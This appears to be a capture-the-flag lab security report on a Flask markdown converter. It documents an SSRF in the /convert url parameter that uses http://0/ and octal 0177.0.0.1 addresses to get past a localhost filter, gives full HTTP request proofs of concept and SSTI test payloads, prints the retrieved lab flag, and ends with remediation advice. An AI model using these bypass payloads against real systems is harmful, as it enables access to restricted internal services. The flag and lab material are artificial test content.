# Security Assessment Report: Markdown to HTML Converter

## TL;DR
- Objective: Find and bypass localhost-restricted admin interface access controls
- Outcome: **ACHIEVED** - Admin interface discovered and accessed via SSRF bypass
- Highest-impact finding: Server-Side Request Forgery (SSRF) allowing complete localhost access bypass
- Validation status: **Confirmed** - Flag extracted successfully

## Target Information
- Target: 127.0.0.1:32939
- Host / base URL: http://127.0.0.1:32939
- Application or component: Flask Markdown to HTML Converter
- Authentication context: Unauthenticated access to main converter; admin interface restricted to localhost connections only
- Relevant technology details: Flask (Werkzeug/3.0.6 Python/3.8.20), uses Python urllib library for URL fetching

## Confirmed Vulnerability
### Server-Side Request Forgery (SSRF) in /convert Endpoint
- Affected endpoint / component: POST /convert - `url` parameter
- Impact: **Critical** - Allows attacker to make arbitrary HTTP requests from the server, including complete access to localhost-restricted resources
- Preconditions: None; endpoint accessible without authentication
- Exact payload or PoC:
  ```
  POST /convert HTTP/1.1
  Host: 127.0.0.1:32939
  Content-Type: application/x-www-form-urlencoded

  url=http://0/admin/flag
  ```
  
  Alternative bypass representation also confirmed working:
  - `http://0177.0.0.1/` (octal notation)

### Localhost Admin Interface Discovery
- Affected endpoint / component: /admin (GET), /admin/flag (GET)
- Impact: **High** - Admin interface accessible only to localhost connections was fully exposed via SSRF bypass; no additional authentication required
- Preconditions: Requires SSRF vulnerability to bypass localhost restriction
- Evidence of admin interface:
  ```html
  <header>
      <h1>Welcome to the Admin Interface</h1>
  </header>
  <main>
      <ul>
          <li><a href="/admin/flag">View Flag</a></li>
          <li><a href="/">Markdown Converter</a></li>
      </ul>
  </main>
  ```

## Steps to Reproduce

1. **Verify SSRF capability with external request**:
   ```
   POST /convert HTTP/1.1
   Host: 127.0.0.1:32939
   Content-Type: application/x-www-form-urlencoded

   url=https://httpbin.org/get
   ```
   - Observe successful external fetch confirms SSRF vulnerability exists

2. **Bypass localhost restriction using IP shorthand**:
   ```
   POST /convert HTTP/1.1
   Host: 127.0.0.1:32939
   Content-Type: application/x-www-form-urlencoded

   url=http://0/
   ```
   - Note: Direct `http://127.0.0.1/` is blocked by application-level restrictions
   - The `http://0/` shorthand bypasses IP-based filtering

3. **Discover admin interface**:
   ```
   POST /convert HTTP/1.1
   Host: 127.0.0.1:32939
   Content-Type: application/x-www-form-urlencoded

   url=http://0/admin
   ```
   - Returns the admin interface HTML showing "Welcome to the Admin Interface" with links to `/admin/flag`

4. **Extract the flag**:
   ```
   POST /convert HTTP/1.1
   Host: 127.0.0.1:32939
   Content-Type: application/x-www-form-urlencoded

   url=http://0/admin/flag
   ```
   - Returns the flag value

## Validation / Evidence
- **Validation token / flag**: `FLAG{9a23b34477e5d66152607b8bf6cb296638ac520b70d4dd1f2f01326c6548a8c2}`
  - Retrieved via `url=http://0/admin/flag` SSRF payload

- **Tool evidence**: SSRF confirmed through differential responses:
  - External URL fetch (httpbin.org) returned different content than blocked localhost attempts
  - `http://0/` bypass successfully returned localhost content when direct `127.0.0.1` was blocked

- **Request evidence**:
  ```
  POST /convert HTTP/1.1
  Host: 127.0.0.1:32939
  Content-Type: application/x-www-form-urlencoded

  url=http://0/admin/flag
  ```

- **Response evidence**: Admin interface HTML rendered in response showing:
  ```
  <h1>Welcome to the Admin Interface</h1>
  <a href="/admin/flag">View Flag</a>
  ```
  
  Flag response contained: `FLAG{9a23b34477e5d66152607b8bf6cb296638ac520b70d4dd1f2f01326c6548a8c2}`

- **Notes on reliability / limitations**:
  - Bypass using `http://0/` is reliable and does not require timing or browser interaction
  - Direct `127.0.0.1` and `localhost` references are blocked at application level
  - Octal notation `0177.0.0.1` also confirmed working as alternative bypass
  - Exploitation is 100% reliable in current configuration

## Remediation
- **Root cause**: The application accepts user-supplied URLs via the `url` parameter without validating or sanitizing them. Python's urllib library resolves various IP representations (including `0` as localhost shorthand) that bypass simple string-based filtering.

- **Recommended fix**:
  1. **Implement URL whitelist/allowlist**: Only permit URLs to explicitly-approved external domains
  2. **Parse and validate IP addresses**: Resolve hostnames to IPs and block all private/reserved ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16, 0.0.0.0/8)
  3. **Use a URL parser**: Extract hostname, resolve to IP, then validate against blocked ranges before making requests
  4. **Disable URL fetching functionality** if not strictly required by business logic
  5. **Add authentication layer** to admin interface independent of IP-based restrictions

- **Defense-in-depth**:
  - Implement network segmentation (firewall rules) preventing application server from connecting to internal services
  - Add authentication requirement to admin interface even for localhost access
  - Log all outbound URL fetch requests for monitoring
  - Run URL-fetching service in isolated container/namespace with limited network access

## How to Verify the Fix
1. **Attempt direct SSRF to localhost**:
   ```
   POST /convert HTTP/1.1
   Content-Type: application/x-www-form-urlencoded

   url=http://0/admin/flag
   ```
   - **Expected secure result**: Request rejected or blocked; no internal content returned

2. **Attempt octal bypass**:
   ```
   url=http://0177.0.0.1/admin
   ```
   - **Expected secure result**: Request rejected; IP normalization and validation prevents bypass

3. **Verify valid external URLs still work** (if required):
   ```
   url=https://httpbin.org/get
   ```
   - **Expected result**: External content fetched successfully (if functionality is still enabled)

4. **Direct admin interface access test**:
   - Access `http://127.0.0.1:32939/admin` from non-localhost IP
   - **Expected secure result**: Access denied regardless of SSRF status

## Remaining Leads
- **Confirmed blockers**: None; task fully achieved
- **Unverified leads**: None
- **Missing context**: None
- **Attempted but ruled out**: Server-Side Template Injection (SSTI) tested with payloads `{{7*7}}` and `{{config.items()}}` - application rendered these as literal text without evaluation (not vulnerable)

---
**Report Confidence**: 1.00 (High)  
**Assessment Status**: Complete  
**Flag Retrieved**: `FLAG{9a23b34477e5d66152607b8bf6cb296638ac520b70d4dd1f2f01326c6548a8c2}`
